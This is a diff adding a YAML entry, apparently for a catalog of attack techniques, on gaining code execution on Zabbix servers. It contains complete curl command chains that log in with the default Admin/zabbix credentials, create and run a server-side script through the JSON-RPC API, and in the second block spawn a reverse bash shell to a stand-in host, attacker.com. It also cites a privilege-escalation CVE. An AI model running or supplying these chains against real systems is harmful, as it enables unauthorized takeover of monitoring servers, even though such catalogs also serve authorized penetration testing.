@@ -1,0 +1,81 @@
+---
+comment: |
+  Zabbix is an enterprise network and application monitoring platform. The primary
+  exploitation path for admin users is the Script execution feature: administrators
+  create shell scripts that run on the Zabbix server or monitored agents via the
+  web UI or JSON-RPC API at /zabbix/api_jsonrpc.php.
+
+  CVE-2024-42327 (CVSS 9.9) is a SQL injection in the CUser.get API method that
+  allows any authenticated user to escalate privileges to admin, unlocking the
+  script execution path without requiring initial admin credentials.
+  Affects Zabbix 6.0.0-6.0.31, 6.4.0-6.4.16, and 7.0.0.
+
+  Default credentials are Admin/zabbix. The API endpoint is typically at
+  /zabbix/api_jsonrpc.php or /api_jsonrpc.php depending on the installation.
+functions:
+  rce:
+  - code: |
+      # Step 1: authenticate and retrieve a session token
+      TOKEN=$(curl -s -X POST http://victim.com/zabbix/api_jsonrpc.php \
+        -H 'Content-Type: application/json' \
+        -d '{"jsonrpc":"2.0","method":"user.login","params":{"username":"Admin","password":"zabbix"},"id":1}' \
+        | python3 -c "import sys,json; print(json.load(sys.stdin)['result'])")
+
+      # Step 2: retrieve a host ID (required to invoke script.execute)
+      HOSTID=$(curl -s -X POST http://victim.com/zabbix/api_jsonrpc.php \
+        -H 'Content-Type: application/json' \
+        -d "{\"jsonrpc\":\"2.0\",\"method\":\"host.get\",\"params\":{\"limit\":1,\"output\":[\"hostid\"]},\"auth\":\"${TOKEN}\",\"id\":2}" \
+        | python3 -c "import sys,json; print(json.load(sys.stdin)['result'][0]['hostid'])")
+
+      # Step 3: create a global script that executes on the Zabbix server (execute_on=1)
+      SCRIPTID=$(curl -s -X POST http://victim.com/zabbix/api_jsonrpc.php \
+        -H 'Content-Type: application/json' \
+        -d "{\"jsonrpc\":\"2.0\",\"method\":\"script.create\",\"params\":{\"name\":\"rce\",\"command\":\"id\",\"execute_on\":1,\"type\":0,\"scope\":2},\"auth\":\"${TOKEN}\",\"id\":3}" \
+        | python3 -c "import sys,json; print(json.load(sys.stdin)['result']['scriptids'][0])")
+
+      # Step 4: execute the script and retrieve output
+      curl -s -X POST http://victim.com/zabbix/api_jsonrpc.php \
+        -H 'Content-Type: application/json' \
+        -d "{\"jsonrpc\":\"2.0\",\"method\":\"script.execute\",\"params\":{\"scriptid\":\"${SCRIPTID}\",\"hostid\":\"${HOSTID}\"},\"auth\":\"${TOKEN}\",\"id\":4}"
+    comment: |
+      Admin script execution via the Zabbix JSON-RPC API. script.create creates a shell
+      script with execute_on=1 (Zabbix server) and scope=2 (manual host action). Command
+      output is returned inline in the script.execute response under result.value.
+
+      execute_on values: 0=agent, 1=server/proxy, 2=server only.
+      scope values: 1=action operations, 2=manual host action, 4=manual event action.
+
+      If execute_on=1 returns empty output, try execute_on=0 to run on the monitored
+      agent instead (requires Zabbix agent on the target host with remote commands enabled).
+    contexts:
+      admin:
+  reverse-shell:
+  - blind: true
+    code: |
+      TOKEN=$(curl -s -X POST http://victim.com/zabbix/api_jsonrpc.php \
+        -H 'Content-Type: application/json' \
+        -d '{"jsonrpc":"2.0","method":"user.login","params":{"username":"Admin","password":"zabbix"},"id":1}' \
+        | python3 -c "import sys,json; print(json.load(sys.stdin)['result'])")
+
+      HOSTID=$(curl -s -X POST http://victim.com/zabbix/api_jsonrpc.php \
+        -H 'Content-Type: application/json' \
+        -d "{\"jsonrpc\":\"2.0\",\"method\":\"host.get\",\"params\":{\"limit\":1,\"output\":[\"hostid\"]},\"auth\":\"${TOKEN}\",\"id\":2}" \
+        | python3 -c "import sys,json; print(json.load(sys.stdin)['result'][0]['hostid'])")
+
+      SCRIPTID=$(curl -s -X POST http://victim.com/zabbix/api_jsonrpc.php \
+        -H 'Content-Type: application/json' \
+        -d "{\"jsonrpc\":\"2.0\",\"method\":\"script.create\",\"params\":{\"name\":\"rs\",\"command\":\"bash -c 'bash -i >& /dev/tcp/attacker.com/12345 0>&1' &\",\"execute_on\":1,\"type\":0,\"scope\":2},\"auth\":\"${TOKEN}\",\"id\":3}" \
+        | python3 -c "import sys,json; print(json.load(sys.stdin)['result']['scriptids'][0])")
+
+      curl -s -X POST http://victim.com/zabbix/api_jsonrpc.php \
+        -H 'Content-Type: application/json' \
+        -d "{\"jsonrpc\":\"2.0\",\"method\":\"script.execute\",\"params\":{\"scriptid\":\"${SCRIPTID}\",\"hostid\":\"${HOSTID}\"},\"auth\":\"${TOKEN}\",\"id\":4}"
+    comment: |
+      Spawns a reverse bash shell via the Zabbix script execution API. The trailing &
+      detaches the shell so script.execute returns immediately. The shell runs as the
+      zabbix process user (commonly zabbix, or root in containerized deployments).
+    contexts:
+      admin:
+    listener: tcp-server
+    tty: false
+...
